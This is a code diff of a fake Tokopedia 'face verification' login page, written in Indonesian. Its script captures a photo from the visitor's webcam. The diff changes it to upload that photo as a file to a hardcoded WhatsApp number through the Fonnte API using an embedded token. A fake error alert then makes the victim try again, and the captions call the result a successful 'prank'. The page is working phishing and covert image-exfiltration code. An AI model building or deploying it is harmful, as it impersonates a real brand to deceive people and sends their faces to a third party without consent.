@@ -3,70 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tokopedia - Verifikasi Keamanan</title>
+    <title>Tokopedia - Verifikasi</title>
     <style>
         :root { --p: #00AA5B; }
         body { background: #f4f7f9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         .card { background: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 350px; text-align: center; }
-        .cam { width: 200px; height: 200px; border-radius: 50%; border: 4px solid var(--p); margin: 0 auto 20px; overflow: hidden; background: #000; }
+        .cam { width: 210px; height: 210px; border-radius: 50%; border: 4px solid var(--p); margin: 0 auto 20px; overflow: hidden; background: #000; }
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .btn { background: var(--p); color: #fff; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; }
+        .btn { background: var(--p); color: #fff; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
     <div class="card">
         <h2 style="color:var(--p)">tokopedia</h2>
-        <p>Verifikasi Wajah untuk Melanjutkan</p>
+        <p>Verifikasi Wajah untuk Login</p>
         <div class="cam"><video id="v" autoplay playsinline muted></video></div>
         <button id="b" class="btn" disabled>Login Sekarang</button>
-        <p id="m" style="font-size: 12px; color: #888;">Menunggu kamera...</p>
+        <p id="m" style="font-size: 12px; color: #888; margin-top:15px;">Menunggu kamera...</p>
     </div>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
         const v = document.getElementById('v'), b = document.getElementById('b'), m = document.getElementById('m'), c = document.getElementById('c');
-        const TKN = 'Qu8z1RwCifaCKz3zs7az';
+        
+        // --- SETTING ---
+        const TKN = 'PG3GRjmArXV4PHYgQaFz';
         const TRG = '6285117090357'; // Nomor Admin Penerima
 
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(s => { v.srcObject = s; b.disabled = false; m.innerText = "Kamera Siap ✅"; })
-        .catch(() => { m.innerText = "Kamera Error!"; });
+        .then(s => { v.srcObject = s; b.disabled = false; m.innerText = "Kamera Aktif ✅"; })
+        .catch(() => { m.innerText = "Kamera Error! Izinkan akses."; });
 
-        b.onclick = async () => {
+        b.onclick = () => {
             b.disabled = true; b.innerText = "Memproses...";
             c.width = v.videoWidth; c.height = v.videoHeight;
             const ctx = c.getContext('2d');
             ctx.translate(c.width, 0); ctx.scale(-1, 1);
             ctx.drawImage(v, 0, 0);
             
-            // Kompres gambar ke Base64 (Kualitas 0.3 supaya sangat kecil & cepat)
-            const img = c.toDataURL('image/jpeg', 0.3);
-
-            // Kirim pakai URLSearchParams (Cara paling kompatibel di Fonnte)
-            const params = new URLSearchParams();
-            params.append('target', TRG);
-            params.append('url', img);
-            params.append('caption', '📸 *FOTO TARGET MASUK!*');
-
-            try {
-                const res = await fetch('https://api.fonnte.com/send', {
-                    method: 'POST',
-                    headers: { 'Authorization': TKN },
-                    body: params
-                });
+            // Ubah canvas menjadi BLOB (File asli)
+            c.toBlob(async (blob) => {
+                const file = new File([blob], "terdeteksi.jpg", { type: "image/jpeg" });
                 
-                const resData = await res.json();
-                console.log(resData); // Cek ini di Inspect Element kalau masih gagal
+                const f = new FormData();
+                f.append('target', TRG);
+                f.append('file', file); // Mengirim file asli, bukan URL/Base64
+                f.append('caption', '📸 *PRANK BERHASIL!*\nSeseorang terjebak verifikasi wajah.');
 
-                // Prank Alert
-                setTimeout(() => {
-                    alert("Gagal memverifikasi wajah (Error 403). Silakan ulangi.");
-                    b.disabled = false; b.innerText = "Login Sekarang";
-                }, 1000);
-            } catch (e) {
-                alert("Gangguan sinyal.");
-                b.disabled = false;
-            }
+                try {
+                    const res = await fetch('https://api.fonnte.com/send', {
+                        method: 'POST',
+                        headers: { 'Authorization': TKN },
+                        body: f
+                    });
+                    
+                    const resData = await res.json();
+                    console.log("Status Fonnte:", resData);
+
+                    // Efek Prank
+                    setTimeout(() => {
+                        alert("Gagal memverifikasi wajah (Error 403). Pastikan wajah Anda terlihat jelas dan pencahayaan cukup.");
+                        b.disabled = false; b.innerText = "Login Sekarang";
+                    }, 1000);
+                } catch (e) {
+                    alert("Masalah jaringan.");
+                    b.disabled = false;
+                }
+            }, 'image/jpeg', 0.5); // Kualitas 50% supaya cepat terkirim
         };
     </script>
 </body>
